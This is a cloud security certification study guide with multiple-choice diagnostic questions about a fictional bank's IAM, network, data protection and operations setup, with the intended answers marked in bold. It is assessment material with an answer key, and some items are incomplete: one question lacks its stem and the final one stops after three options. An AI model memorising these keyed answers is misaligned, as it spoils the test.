## Professional Cloud Security Engineer Certification Learning Path

# 01 Preparing for Your Professional Cloud Security Engineer Journey 

## Configuring Access Within a Cloud Solution Environment



### Diagnostic questions



1. Cymbal Bank recently discovered service account key misuse in one of the teams during a security audit. As a precaution, going forward you do not want any team in your organization to generate new external service account keys. You also want to restrict every new service account’s usage to its associated Project. What should you do?



- Navigate to Organizational policies in the Google Cloud Console. Select your organization. Select iam.disableServiceAccountKeyCreation. Under Policy Enforcement, select Merge with parent. Click Save. Repeat the process for iam.disableCrossProjectServiceAccountLienRemoval.



- Run the gcloud resource-manager org-policies enable-enforce command with the constraints iam.disableServiceAccountKeyCreation, and iam.disableCrossProjectServiceAccountUsage and the Project IDs you want the constraints to apply to.



- **Navigate to Organizational policies in the Google Cloud Console. Select your organization. Select iam.disableServiceAccountKeyCreation. Customize the applied to property, and set Enforcement to ‘On’. Click Save. Repeat the process for iam.disableCrossProjectServiceAccountUsage.**



- Run the gcloud resource-manager org-policies allow command with the boolean constraints iam.disableServiceAccountKeyCreation and iam.disableCrossProjectServiceAccountUsage with Organization ID.

  

2. Cymbal Bank publishes its APIs through Apigee. Cymbal Bank has recently acquired ABC Corp, which uses a third-party identity provider. You have been tasked with connecting ABC Corp’s identity provider to Apigee for single sign-on (SSO). You need to set up SSO so that Google is the service provider. You also want to monitor and log high-risk activities. Which two choices would you select to enable SSO?

- Use openssl to generate public and private keys. Store the private key in an X.509 certificate, and encrypt using AES or DES for SAML. Sign in to the Google Admin console, and under Security, upload the certificate.

- Review Network mapping results, and assign SAML profiles to required users.

- **Review Network mapping results, and assign SSO profiles to required users.**

- Use openssl to generate a private key. Store the private key in an X.509 certificate, and encrypt using AES or DES for SAML. Sign in to the Google Workspace Admin Console and upload the certificate.

- **Use openssl to generate public and private keys. Store the public key in an X.509 certificate, and encrypt using RSA or DSA for SAML. Sign in to the Google Admin console, and under Security, upload the certificate.**



3. Cymbal Bank has certain default permissions and access for their analyst, finance, and teller teams. These teams are organized into groups that have a set of role-based IAM permissions assigned to them. After a recent acquisition of a small bank, you find that the small bank directly assigns permissions to their employees in IAM. You have been tasked with applying Cymbal Bank’s resource hierarchy to the small bank. Employees will need access to Google Cloud services. What should you do?

- Reset all user permissions in the small bank’s IAM. Use the Directory API in the Google Workspace Admin SDK to create Google Groups. Use a Python script to allocate users to the groups.

- **Reset all user permissions in the small bank’s IAM. Use Cloud Identity to create dynamic groups for each of the bank’s teams. Use the dynamic groups’ metadata field for team type to allocate users to their appropriate group with a Python script.**

- Reset all user permissions in the small bank’s IAM. Use Cloud Identity to create the required Google Groups. Upgrade the Google Groups to Security Groups. Use a Python script to allocate users to the groups.

- Leave all user permissions as-is in the small bank’s IAM. Use the Directory API in the Google Workspace Admin SDK to create Google Groups. Use a Python script to allocate users to the Google Groups.



4. Cymbal Bank’s organizational hierarchy divides the Organization into departments. The Engineering Department has a ‘product team’ folder. This folder contains folders for each of the bank’s products. One folder titled “analytics” contains a Google Cloud Project that contains an App Engine deployment and a Cloud SQL instance.

- Create custom roles for all three user types at the project level. For the team lead, provide all appengine.* and cloudsql.* permissions. For the developer, provide appengine.applications.* and appengine.instances.* permissions. For the code reviewer, provide the appengine.instances.* permissions.

- Assign the basic ‘Editor’ role to the team lead. Create a custom role for the developer. Provide all appengine.* permissions to the developer. Provide the predefined ‘App Engine Code Viewer’ role to the code reviewer. Assign all these permissions at the “analytics” folder level.

- **Assign the basic ‘App Engine Admin’ and ‘Cloud SQL Admin” roles to the team lead. Assign the ‘App Engine Admin’ role to the developer. Assign the ‘App Engine Code Viewer’ role to the code reviewer. Assign all these permissions at the analytics project level.**

- Create custom roles for all three user types at the “analytics” folder level. For the team lead, provide all appengine.* and cloudsql.* permissions. For the developer, provide appengine.applications.* and appengine.instances.* permissions. For the code reviewer, provide the appengine.instances.* permissions.

  

5. You are an administrator for Cymbal Bank’s Mobile Development Team. You want to control how long different users can access the Google Cloud console, the Cloud SDK, and any applications that require user authorization for Google Cloud scopes without having to reauthenticate. More specifically, you want users with elevated privileges (project owners and billing administrators) to reauthenticate more frequently than regular users at the organization level. What should you do?

- Create a custom role for project owners and billing administrators at the organization level in the Google Cloud console. Add the reauthenticationRequired permission to this role. Assign this role to each project owner and billing administrator.

- **In the Admin console, select Google Cloud session control and set a reauthentication policy that requires reauthentication. Choose the reauthentication frequency from the drop-down list.**

- Open all Google Cloud projects that belong to Cymbal Bank’s Mobile Development team. Find each project’s Google Cloud session control setting, and configure a reauthentication policy that requires reauthentication. Choose the reauthentication frequency from the drop-down list.

- Create a custom role for project owners and billing administrators at the organization level in the Google Cloud console. Add the reauthenticationRequired permission to this role. Create a Google Group that contains all billing administrators and project owners. Apply the custom role to the group.

  

6. Cymbal Bank has a team of developers and administrators working on different sets of Google Cloud resources. The Bank’s administrators should be able to access the serial ports on Compute Engine Instances and create service accounts. Developers should only be able to access serial ports. How would you design the organization hierarchy to provide the required access?

- **Deny Serial Port Access and Service Account Creation at the organization level. Create a ‘dev’ folder and set enforced: true for constraints/compute.disableSerialPortAccess and enforced: true for constraints/iam.disableServiceAccountCreation. Create a new ‘admin’ folder inside the ‘dev’ folder, and set enforced: false for constraints/iam.disableServiceAccountCreation. Give developers access to the ‘dev’ folder, and administrators access to the ‘admin’ folder.**

- Deny Serial Port Access and Service Account Creation at the organization level. Create a ‘dev’ folder and set enforced: false for constraints/compute.disableSerialPortAccess. Create a new ‘admin’ folder inside the ‘dev’ folder, and set enforced: false for constraints/iam.disableServiceAccountCreation. Give developers access to the ‘dev’ folder, and administrators access to the ‘admin’ folder.

- Deny Serial Port Access and Service Account Creation at the Organization level. Create an ‘admin’ folder and set enforced: false for constraints/compute.disableSerialPortAccess. Create a new ‘dev’ folder inside the ‘admin’ folder, and set enforced: false for constraints/iam.disableServiceAccountCreation. Give developers access to the ‘dev’ folder, and administrators access to the ‘admin’ folder.

- Allow Serial Port Access and Service Account Creation at the organization level. Create a ‘dev’ folder and set enforced: true for constraints/iam.disableServiceAccountCreation. Create another ‘admin’ folder that inherits from the parent inside the organization node. Give developers access to the ‘dev’ folder, and administrators access to the ‘admin’ folder.

  

7. Cymbal Bank has acquired a non-banking financial company (NBFC). This NBFC uses Active Directory as their central directory on an on-premises Windows Server. You have been tasked with migrating all the NBFC users and employee information to Cloud Identity. What should you do?

- **Use Cloud VPN to connect the on-premises network to your Google Cloud environment. Select an on-premises domain-joined Windows Server. On the domain-joined Windows Server, run Configuration Manager and Google Cloud Directory Sync. Use Cloud VPN’s encrypted channel to transfer users from the on-premises Active Directory to Cloud Identity.**

- Run Configuration Manager on a Compute Engine instance. Copy the resulting configuration file from this machine onto a new Compute Engine instance to keep the production environment separate from the staging environment. Leave the channel unencrypted because you are in a secure Google Cloud environment. Deploy Google Cloud Directory Sync on this new instance. Connect to the on-premises Windows Server environment from the new instance, and migrate users to Cloud Identity.

- Run Microsoft System Center Configuration Manager (SCCM) on a Compute Engine instance. Leave the channel unencrypted because you are in a secure Google Cloud environment. Deploy Google Cloud Directory Sync on the Compute Engine instance. Connect to the on-premises Windows Server environment from the instance, and migrate users to Cloud Identity.

- Select an on-premises domain-joined Windows Server. Run Configuration Manager on the domain-joined Windows Server, and copy the resulting configuration file to a Compute Engine instance. Run Google Cloud Directory Sync on the Compute Engine instance over the internet, and use Cloud VPN to sync users from the on-premises Active Directory to Cloud Identity.

  

8. Cymbal Bank’s organizational hierarchy divides the Organization into departments. The Engineering Department has a ‘product team’ folder. This folder contains folders for each of the bank’s products. Each product folder contains one Google Cloud Project, but more may be added. Each project contains an App Engine deployment. Cymbal Bank has hired a new technical product manager and a new web developer. The technical product manager must be able to interact with and manage all services in projects that roll up to the Engineering Department folder. The web developer needs read-only access to App Engine configurations and settings for a specific product. How should you provision the new employees’ roles into your hierarchy following principles of least privilege?

- Assign the Project Owner role in each individual project to the technical product manager. Assign the App Engine Deployer role in each individual project to the web developer.

- Assign the Project Editor role at the Engineering Department folder level to the technical product manager. Create a Custom Role in the product folder that the web developer needs access to. Add the appengine.versions.create and appengine.versions.delete permissions to that role, and assign it to the web developer.

- **Assign the Project Editor role at the Engineering Department folder level to the technical product manager. Assign the App Engine Deployer role at the specific product’s folder level to the web developer.**

- Assign the Project Editor role in each individual project to the technical product manager. Assign the Project Editor role in each individual project to the web developer.



9. Cymbal Bank is divided into separate departments. Each department is divided into teams. Each team works on a distinct product that requires Google Cloud resources for development. How would you design a Google Cloud organization hierarchy to best match Cymbal Bank’s organization structure and needs?

- Create an Organization node. Under the Organization node, create Department folders. Under each Department, create Product folders. Add Projects to the Product folders.

- Create an Organization node. Under the Organization node, create Department folders. Under each Department, create Product folders. Under each Product, create Teams folders. In the Teams folder, add Projects.

- **Create an Organization node. Under the Organization node, create Department folders. Under each Department, create a Teams folder. Under each Team, create Product folders. Add Projects to the Product folders.**

- Create an Organization node. Under the Organization node, create Department folders. Under each Department, create Teams folders. Add Projects to the Teams folders.

  

10. Cymbal Bank leverages Google Cloud storage services, an on-premises Apache Spark Cluster, and a web application hosted on a third-party cloud. The Spark cluster and web application require limited access to Cloud Storage buckets and a Cloud SQL instance for only a few hours per day. You have been tasked with sharing credentials while minimizing the risk that the credentials will be compromised. What should you do?

- **Create a service account with appropriate permissions. Have the Spark Cluster and the web application authenticate as delegated requests, and share the short-lived service account credential as a JWT.**

- Create a service account with appropriate permissions. Authenticate the Spark Cluster and the web application as direct requests and share the service account key.

- Create a service account with appropriate permissions. Authenticate the Spark Cluster and the web application as a delegated request, and share the service account key.

- Create a service account with appropriate permissions. Have the Spark Cluster and the web application authenticate as a direct request, and share the short-lived service account credentials as XML tokens.

### Knowledge Check



1. Which tool will Cymbal Bank use to synchronize their identities from their on-premise identity management system to Google Cloud?

- Service Accounts

- Cloud Identity

- Active Directory

- **Google Cloud Directory Sync**

  

2. Which feature of Google Cloud will Cymbal Bank use to control the source locations and times that authorized identities will be able to access resources?

- **IAM Conditions**

- Identity-aware Proxy

- Service Accounts

- IAM Roles



## Securing Communications and Establishing Boundary Protection

### Diagnostic questions

1. Cymbal Bank is releasing a new loan management application using a Compute Engine managed instance group. External users will connect to the application using a domain name or IP address protected with TLS 1.2. A load balancer already hosts this application and preserves the source IP address. You are tasked with setting up the SSL certificate for this load balancer. What should you do?

- Create a Google-managed SSL certificate. Attach a global dynamic external IP address to the internal Application Load Balancer. Validate that an existing URL map will route the incoming service to your managed instance group backend. Load your certificate and create an HTTPS proxy routing to your URL map. Create a global forwarding rule that routes incoming requests to the proxy.

- Import a self-managed SSL certificate. Attach a global static external IP address to the external proxy Network Load Balancer. Validate that an existing URL map will route the incoming service to your managed instance group backend. Load your certificate and create a TCP proxy routing to your URL map. Create a global forwarding rule that routes incoming requests to the proxy.

- Import a self-managed SSL certificate. Attach a global static external IP address to the external proxy Network Load Balancer. Validate that an existing URL map will route the incoming service to your managed instance group backend. Load your certificate and create an SSL proxy routing to your URL map. Create a global forwarding rule that routes incoming requests to the proxy.

- **Create a Google-managed SSL certificate. Attach a global static external IP address to the global external Application Load Balancer. Validate that an existing URL map will route the incoming service to your managed instance group backend. Load your certificate and create an HTTPS proxy routing to your URL map. Create a global forwarding rule that routes incoming requests to the proxy.**

2. You have recently joined Cymbal Bank as a cloud engineer. You created a custom VPC network, selecting to use the automatic subnet creation mode and nothing else. The default network still exists in your project. You create a new Linux VM instance and select the custom VPC as the network interface. You try to SSH into your instance, but you are getting a “connection failed” error. What answer best explains why you cannot SSH into the instance?

- **You did not set up any firewall rules on your custom VPC network. While the default VPC comes with a predefined firewall rule that allows SSH traffic, these need to be added to any custom VPCs.**

- You should have used the default network when setting up your instance. While custom networks support instance creation, they should only be used for internal communication.

- You should have deleted the default network. When you have multiple VPCs in your project, Compute Engine can’t allow you to connect because overlapping IP ranges prevent the API from establishing a root connection.

- You should have used custom subnet creation mode. Since the default VPC still exists, automatic mode created subnets in the same regions, which led to overlapping IP addresses.

3. Cymbal Bank has published an API that internal teams will use through the Application Load Balancer. You need to limit the API usage to 200 calls every hour. Any exceeding usage should inform the users that servers are busy. Which gcloud command would you run to throttle the load balancing for the given specification?

- gcloud compute security-policies rules create priority --security-policy sec-policy --src-ip-ranges="" --action=rate-based-ban --rate-limit-threshold-count=200 --rate-limit-threshold-interval-sec=3600 --conform-action=allow --exceed-action=deny-500 --enforce-on-key=IP

- gcloud compute security-policies rules create priority --security-policy sec-policy --src-ip-ranges=source-range --action=throttle --rate-limit-threshold-count=200 --rate-limit-threshold-interval-sec=60 --conform-action=deny --exceed-action=deny-404 --enforce-on-key=HTTP-HEADER

- gcloud compute security-policies rules create priority --security-policy sec-policy --src-ip-ranges=source-range --action=rate-based-ban --rate-limit-threshold-count=200 --rate-limit-threshold-interval-sec=3600 --conform-action=deny --exceed-action=deny-403 --enforce-on-key=HTTP-HEADER

- **gcloud compute security-policies rules create priority --security-policy sec-policy --src-ip-ranges=source-range --action=throttle --rate-limit-threshold-count=200 --rate-limit-threshold-interval-sec=3600 --conform-action=allow --exceed-action=deny-429 --enforce-on-key=HTTP-HEADER**

4. An external audit agency needs to perform a one-time review of Cymbal Bank’s Google Cloud usage. The auditors should be able to access a Default VPC containing BigQuery, Cloud Storage, and Compute Engine instances where all the usage information is stored. You have been tasked with enabling the access from their on-premises environment, which already has a configured VPN. What should you do?

- Use Partner Interconnect. Configure an encrypted tunnel in the auditor's on-premises environment. Use Cloud DNS to create DNS zones and A records for private.googleapis.com.

- **Use a Cloud VPN tunnel. Use Cloud DNS to create DNS zones and records for *.googleapis.com. Set up on-premises routing with Cloud Router. Use Cloud Router custom route advertisements to announce routes for Google Cloud destinations.**

- Use a Cloud VPN tunnel. Use your DNS provider to create DNS zones and records for private.googleapis.com. Connect the DNS provider to your on-premises network. Broadcast the request from the on-premises environment. Use a software-defined firewall to manage incoming and outgoing requests.

- Use Dedicated Interconnect. Configure a VLAN in the auditor's on-premises environment. Use Cloud DNS to create DNS zones and records for restricted.googleapis.com and private.googleapis.com. Set up on-premises routing with Cloud Router. Add custom static routes in the VPC to connect individually to BigQuery, Cloud Storage, and Compute Engine instances.

5. Cymbal Bank’s Customer Details API runs on a Compute Engine instance with only an internal IP address. Cymbal Bank’s new branch is co-located outside the Google Cloud points-of-presence (PoPs) and requires a low-latency way for its on-premises apps to consume the API without exposing the requests to the public internet. Which solution would you recommend?

- Use Carrier Peering. Use a service provider to access their enterprise grade infrastructure to connect to the Google Cloud environment.

- **Use Partner Interconnect. Use a service provider to access their enterprise grade infrastructure to connect to the Google Cloud environment.**

- Use a Content Delivery Network (CDN). Establish direct peering with one of Google’s nearby edge-enabled PoPs.

- Use Dedicated Interconnect. Establish direct peering with one of Google’s nearby edge-enabled PoPs.

6. Your organization has a website running on Compute Engine. This instance only has a private IP address. You need to provide SSH access to an on-premises developer who will debug the website from the authorized on-premises location only. How do you enable this?

- Use the default VPC’s firewall. Open port 22 for TCP protocol using the Google Cloud Console.

- Use SOCKS proxy over SSH. Set up an SSH tunnel to one of the hosts in the network. Create the SOCKS proxy on the client side.

- Set up Cloud VPN. Set up an unencrypted tunnel to one of the hosts in the network. Create outbound or egress firewall rules. Use the private IP address to log in using a gcloud ssh command.

- **Use Identity-Aware Proxy (IAP). Set up IAP TCP forwarding by creating ingress firewall rules on port 22 for TCP using the gcloud command.**

7. Cymbal Bank has designed an application to detect credit card fraud that will analyze sensitive information. The application that’s running on a Compute Engine instance is hosted in a new subnet on an existing VPC. Multiple teams who have access to other VMs in the same VPC must access the VM. You want to configure the access so that unauthorized VMs or users from the internet can’t access the fraud detection VM. What should you do?

- Use target filtering. Create a tag called ‘app’, and assign the tag to both the source and the target. Create a firewall rule to allow all ingress communication on this tag.

- **Use subnet isolation. Create a service account for the fraud detection engine. Create service accounts for each of the teams’ Compute Engine instances that will access the engine. Add a firewall rule using: gcloud compute firewall-rules create ACCESS_FRAUD_ENGINE --network**

- Use target filtering. Create two tags called ‘app’ and ‘data’. Assign the ‘app’ tag to the Compute Engine instance hosting the Fraud Detection App (source), and assign the ‘data’ tag to the other Compute Engine instances (target). Create a firewall rule to allow all ingress communication on this tag.

- Use subnet isolation. Create a service account for the fraud detection VM. Create one service account for all the teams’ Compute Engine instances that will access the fraud detection VM. Create a new firewall rule using:gcloud compute firewall-rules create ACCESS_FRAUD_ENGINE --network

8. Cymbal Bank needs to connect its employee MongoDB database to a new human resources web application on the same network. Both the database and the application are autoscaled with the help of Instance templates. As the Security Administrator and Project Editor, you have been tasked with allowing the application to read port 27017 on the database. What should you do?

- **Create service accounts for the application and database. Create a firewall rule using:gcloud compute firewall-rules create ALLOW_MONGO_DB --network network-name --allow TCP:27017 --source-service-accounts web-application-service-account --target-service-accounts database-service-account**

- Create a user account for the database admin and a service account for the application. Create a firewall rule using:gcloud compute firewall-rules create ALLOW_MONGO_DB --network network-name --allow TCP:27017 --source-service-accounts web-application-service-account --target-service-accounts database-admin-user-account

- Create user accounts for the application and database. Create a firewall rule using:gcloud compute firewall-rules create ALLOW_MONGO_DB --network network-name --deny UDP:27017 --source-service-accounts web-application-user-account --target-service-accounts database-admin-user-account

- Create service accounts for the application and database. Create a firewall rule using:gcloud compute firewall-rules create ALLOW_MONGO_DB --network network-name --allow ICMP:27017 --source-service-accounts web-application-service-account --target-service-accounts database-service-account

9. The data from Cymbal Bank’s loan applicants resides in a shared VPC. A credit analysis team uses a CRM tool hosted in the App Engine standard environment. You need to provide credit analysts with access to this data. You want the charges to be incurred by the credit analysis team. What should you do?

- Add egress firewall rules to allow SSH and/or RDP ports for the App Engine standard environment in the Shared VPC network. Create a client-side connector in the Service Project using the IP range of the target VPC. Verify that the connector is in a READY state. Create an egress rule on the Shared VPC network to allow the connector using Network Tags or IP ranges.

- Add ingress firewall rules to allow NAT and Health Check ranges for App Engine standard environment in the Shared VPC network. Create a server-side connector in the Host Project using the Shared VPC Project ID. Verify that the connector is in a READY state. Create an ingress rule on the Shared VPC network to allow the connector using Network Tags or IP ranges.

- Add egress firewall rules to allow TCP and UDP ports for the App Engine standard environment in the Shared VPC network. Create either a client-side connector in the Service Project or a server-side connector in the Host Project using the IP Range or Project ID of the target VPC. Verify that the connector is in a READY state. Create an egress rule on the Shared VPC network to allow the connector using Network Tags or IP ranges.

- **Add ingress firewall rules to allow NAT and Health Check ranges for the App Engine standard environment in the Shared VPC network. Create a client-side connector in the Service Project using the Shared VPC Project ID. Verify that the connector is in a READY state. Create an ingress rule on the Shared VPC network to allow the connector using Network Tags or IP ranges.**

10. An ecommerce portal uses Google Kubernetes Engine to deploy its recommendation engine in Docker containers. This cluster instance does not have an external IP address. You need to provide internet access to the pods in the Kubernetes cluster. What configuration would you add?

- **Cloud NAT gateway, subnet primary IP address range for nodes, and subnet secondary IP address range for pods and services in the cluster**

- Cloud DNS, subnet primary IP address range for nodes, and subnet secondary IP address range for pods and services in the cluster

- Nginx load balancer, subnet secondary IP address range for nodes, and subnet secondary IP address range for pods and services in the cluster

- Cloud VPN, subnet secondary IP address range for nodes, and subnet secondary IP address range for pods and services in the cluster



### Knowledge Check

1. Which tool will Cymbal Bank use to enforce authentication and authorization for services deployed to Google Cloud?

- Firewall rules

- Google Cloud Armor

- **Identity-Aware proxy**

- Application Load Balancer

2. How will Cymbal Bank enable resources with only internal IP addresses to make requests to the Internet?

- Google private access

- Dedicated Interconnect

- **Cloud NAT**

- Shared VPC



## Ensuring Data Protection

### Diagnostic questions

1. Cymbal Bank has hired a data analyst team to analyze scanned copies of loan applications. Because this is an external team, Cymbal Bank does not want to share the name, gender, phone number, or credit card numbers listed in the scanned copies. You have been tasked with hiding this PII information while minimizing latency. What should you do?

- **Use the Cloud Data Loss Prevention (DLP) API to make redact image requests. Provide your project ID, built-in infoTypes, and the scanned copies when you make the requests.**

- Use the Cloud Vision API to perform optical code recognition (OCR) from scanned images. Redact the text using the Cloud Data Loss Prevention (DLP) API with regular expressions.

- Use the Cloud Vision API to perform text extraction from scanned images. Redact the text using the Cloud Natural Language API with regular expressions.

- Use the Cloud Vision API to perform optical code recognition (OCR) from scanned images. Redact the text using the Cloud Natural Language API with regular expressions.

2. Cymbal Bank uses Google Kubernetes Engine (GKE) to deploy its Docker containers. You want to encrypt the boot disk for a cluster running a custom image so that the key rotation is controlled by the Bank. GKE clusters will also generate up to 1024 randomized characters that will be used with the keys with Docker containers. What steps would you take to apply the encryption settings with a dedicated hardware security layer?

- Create a new key ring using Cloud Key Management Service. Extract this key to a certificate. Use the Google Cloud Console to update the Kubernetes configuration. Validate using MAC digital signatures, and use a startup script to generate random bytes.

- Create a new key ring using Cloud Key Management Service. Extract this key to a certificate. Use the kubectl command to update the Kubernetes configuration. Validate using MAC digital signatures, and use a startup script to generate random bytes.

- **Create a new GKE cluster with customer-managed encryption and HSM enabled. Deploy the containers to this cluster. Delete the old GKE cluster. Use Cloud HSM to generate random bytes and provide an additional layer of security.**

- In the Google Cloud console, navigate to Google Kubernetes Engine. Select your cluster and the boot node inside the cluster. Enable customer-managed encryption. Use Cloud HSM to generate random bytes and provide an additional layer of security.

3. Cymbal Bank stores customer information in a BigQuery table called ‘Information,’ which belongs to the dataset ‘Customers.’ Various departments of Cymbal Bank, including loan, credit card, and trading, access the information table. Although the data source remains the same, each department needs to read and analyze separate customers and customer-attributes. You want a cost-effective way to configure departmental access to BigQuery to provide optimal performance. What should you do?

- Create separate datasets for each department. Create authorized functions in each dataset to perform required aggregations. Write transformed data to new tables for each department separately. Provide the bigquery.dataViewer role to each department’s required users.

- Create an authorized dataset in BigQuery’s Explorer panel. Write Customers’ table metadata into a JSON file, and edit the file to add each department’s Project ID and Dataset ID. Provide the bigquery.user role to each department’s required users.

- Secure data with classification. Open the Data Catalog Taxonomies page in the Google Cloud Console. Create policy tags for required columns and rows. Provide the bigquery.user role to each department’s required users. Provide policy tags access to each department separately.

- **Create separate datasets for each department. Create views for each dataset separately. Authorize these views to access the source dataset. Share the datasets with departments. Provide the bigquery.dataViewer role to each department’s required users.**

4. Cymbal Bank calculates employee incentives on a monthly basis for the sales department and on a quarterly basis for the marketing department. The incentives are released with the next month’s salary. Employee’s performance documents are stored as spreadsheets, which are retained for at least one year for audit. You want to configure the most cost-effective storage for this scenario. What should you do?

- Import the spreadsheets into Cloud Storage and create NoSQL tables. Use App Engine cron jobs to run monthly for Sales and quarterly for Marketing. Use a separate job to delete the data after 1 year.

- **Upload the spreadsheets to Cloud Storage. Select the Nearline storage class for the sales department and Coldline storage for the marketing department. Use object lifecycle management rules to set the storage class to Archival after 365 days. Process the data on BigQuery using jobs that run monthly for Sales and quarterly for Marketing.**

- Import the spreadsheets to Cloud SQL, and create separate tables for Sales and Marketing. For Table Expiration, set 365 days for both tables. Use stored procedures to calculate incentives. Use App Engine cron jobs to run stored procedures monthly for Sales and quarterly for Marketing.

- Import the spreadsheets to BigQuery, and create separate tables for Sales and Marketing. Set table expiry rules to 365 days for both tables. Create jobs scheduled to run every quarter for Marketing and every month for Sales.

5. Cymbal Bank has a Cloud SQL instance that must be shared with an external agency. The agency’s developers will be assigned roles and permissions through a Google Group in Identity and Access Management (IAM). The external agency is on an annual contract and will require a connection string, username, and password to connect to the database. How would you configure the group’s access?

- **Use Secret Manager. Use the duration attribute to set the expiry period to one year. Add the secretmanager.secretAccessor role for the group that contains external developers.**

- Use Secret Manager. Use the resource attribute to set a key-value pair with key as duration and values as expiry period one year from now. Add secretmanager.viewer role for the group that contains external developers.

- Use Secret Manager for the connection string and username, and use Cloud Key Management Service for the password. Use tags to set the expiry period to the timestamp one year from now. Add secretmanager.secretVersionManager and secretmanager.secretAccessor roles for the group that contains external developers.

- Use Cloud Key Management Service. Use the destination IP address and Port attributes to provide access for developers at the external agency. Remove the IAM access after one year and rotate the shared keys. Add cloudkms.cryptoKeyEncryptorDecryptor role for the group that contains the external developers.

6. Cymbal Bank needs to migrate existing loan processing applications to Google Cloud. These applications transform confidential financial information. All the data should be encrypted at all stages, including sharing between sockets and RAM. An integrity test should also be performed every time these instances boot. You need to use Cymbal Bank’s encryption keys to configure the Compute Engine instances. What should you do?

- **Create a Confidential VM instance with Customer-Supplied Encryption Keys. In Cloud Logging, collect all logs for sevLaunchAttestationReportEvent.**

- Create a Confidential VM instance with Customer-Managed Encryption Keys. In Cloud Logging, collect all logs for earlyBootReportEvent.

- Create a Shielded VM instance with Customer-Managed Encryption Keys. In Cloud Logging, collect all logs for sevLaunchAttestationReportEvent.

- Create a Shielded VM instance with Customer-Supplied Encryption Keys. In Cloud Logging, collect all logs for earlyBootReportEvent.

7. Cymbal Bank needs to statistically predict the days customers delay the payments for loan repayments and credit card repayments. Cymbal Bank does not want to share the exact dates a customer has defaulted or made a payment with data analysts. Additionally, you need to hide the customer name and the customer type, which could be corporate or retail. How do you provide the appropriate information to the data analysts?

- Generalize all dates to year and month with bucketing. Use the built-in infoType for customer name. Use a custom infoType for customer type with a custom dictionary.

- **Generalize all dates to year and month with date shifting. Use a predefined infoType for customer name. Use a custom infoType for customer type with a custom dictionary.**

- Generalize all dates to year and month with date shifting. Use a predefined infoType for customer name. Use a custom infoType for customer type with regular expression.

- Generalize all dates to year and month with bucketing. Use the built-in infoType for customer name. Use a custom infoType for customer type with regular expression.

8. You are tasked with developing an AI system on Google Cloud for a telecommunications business. This AI system will conduct sentiment analysis on conversations agents have with customers, and provide conversational recommendations to improve customer satisfaction in the future. What AI/ML-specific security controls do you need to plan for when developing this system?

- **AI systems are more interconnected than non-AI systems. Prepare for new attack vectors, as attackers can exploit vulnerabilities in one system to attack another.**

- Leverage an AI model-specific threat detection scanner. Threats between AI systems and non-AI systems have very little in common.

- Deploy your AI solution using managed instance groups (MIGs). These have baked in security controls specific to running AI workloads.

- Select Google Cloud AI services that leverage a PaaS model. These are the only ones that can guarantee a secure-by-design foundation.

9. You're building a machine learning model on Google Cloud. You're choosing between two options: managing the infrastructure yourself (IaaS) or using Google's managed services (PaaS). To ensure the best security posture for both the model and its data, which TWO factors should you prioritize when defining security requirements for each hosting option?

- **Granular access controls and permissions**

- Compliance with internal security policies

- **Data location and residency restrictions**

- Network traffic inspection and intrusion detection

- Physical server hardening and security patches

10. You are building an AI model on Google Cloud to analyze customer data and predict purchase behavior. This model will have access to sensitive information like purchase history and demographics. To protect this data and prevent misuse of the model, what THREE security controls are most important to implement?

- Store all model training data in BigQuery with public access for transparency.

- Configure IAM roles to grant full access to the model for all Google Cloud users.

- **Monitor the model's performance for anomalies and biases, then manually intervene if needed.**

- **Enable Google Cloud Armor on your deployed model to block malicious requests.**

- **Deploy the model in a region with the highest data security standards.**



### Knowledge Check

1. What feature will allow Cymbal Bank to delete or change the storage class of objects in Cloud Storage buckets?                  

- Rotation periods              
- Retention policies              
- **Lifecycle management rules**              
-  Object versioning

2. Which tool will Cymbal Bank use to scan for, detect, and optionally transform sensitive data to prevent exposure?

- **Sensitive Data Protection**
- Secret Manager
- Google Cloud Armor
- VPC service controls



## Managing Operations

### Diagnostic questions

1. The loan application from Cymbal Bank’s lending department collects credit reports that contain credit payment information from customers. According to bank policy, the PDF reports are stored for six months in Cloud Storage, and access logs for the reports are stored for three years. You need to configure a cost-effective storage solution for the access logs. What should you do?

- Set up a logging export dataset in BigQuery to collect data from Cloud Logging and the Security Command Center. Create table expiry rules to delete logs after three years.

- **Set up a logging export bucket in Cloud Storage to collect data from Cloud Audit Logs. Configure object lifecycle management rules to delete logs after three years.**

- Set up a logging export dataset in BigQuery to collect data from Cloud Logging and Cloud Monitoring. Create table expiry rules to delete logs after three years.

- Set up a logging export bucket in Cloud Storage to collect data from the Security Command Center. Configure object lifecycle management rules to delete logs after three years.

2. Cymbal Bank uses Docker containers to interact with APIs for its personal banking application. These APIs are under PCI-DSS compliance. The Kubernetes environment running the containers will not have internet access to download required packages. How would you automate the pipeline that is building these containers?

- Create a Dockerfile with container definition and cloudbuild.yaml file. Use Cloud Build to build the image from Dockerfile. Upload the built image to a Google Container registry and Dockerfile to a Git repository. In the cloudbuild.yaml template, include attributes to tag the Git repository path with a Google Kubernetes Engine cluster. Create a trigger in Cloud Build to automate the deployment using the Git repository.

- **Create a Dockerfile with a container definition and a Cloud Build configuration file. Use the Cloud Build configuration file to build and deploy the image from Dockerfile to a Google Container registry. In the configuration file, include the Google Container Registry path and the Google Kubernetes Engine cluster. Upload the configuration file to a Git repository. Create a trigger in Cloud Build to automate the deployment using the Git repository.**

- Build a foundation image. Store all artifacts and a Packer definition template in a Git repository. Use Container Registry to build the artifacts and Packer definition. Use Cloud Build to extract the built container and deploy it to a Google Kubernetes Engine (GKE) cluster. Add the required users and groups to the GKE project.

- Build an immutable image. Store all artifacts and a Packer definition template in a Git repository. Use Container Registry to build the artifacts and Packer definition. Use Cloud Build to extract the built container and deploy it to a Google Kubernetes Engine Cluster (GKE). Add the required users and groups to the GKE project.

3. Cymbal Bank runs a Node.js application on a Compute Engine instance. Cymbal Bank needs to share this base image with a ‘development’ Google Group. This base image should support secure boot for the Compute Engine instances deployed from this image. How would you automate the image creation?

- **Prepare a shell script. Add the command gcloud compute instances stop with the Node.js instance name. Set up certificates for secure boot. Add gcloud compute images create, and specify the Compute Engine instance’s persistent disk and zone and the certificate files. Add gcloud compute images add-iam-policy-binding and specify the ‘development’ group.**

- Prepare a shell script. Add the command gcloud compute instances start to the script to start the Node.js Compute Engine instance. Set up Measured Boot for secure boot. Add gcloud compute images create, and specify the persistent disk and zone of the Compute Engine instance.

- Start the Compute Engine instance. Set up certificates for secure boot. Prepare a cloudbuild.yaml configuration file. Specify the persistent disk location of the Compute Engine and the ‘development’ group. Use the command gcloud builds submit --tag, and specify the configuration file path and the certificates.

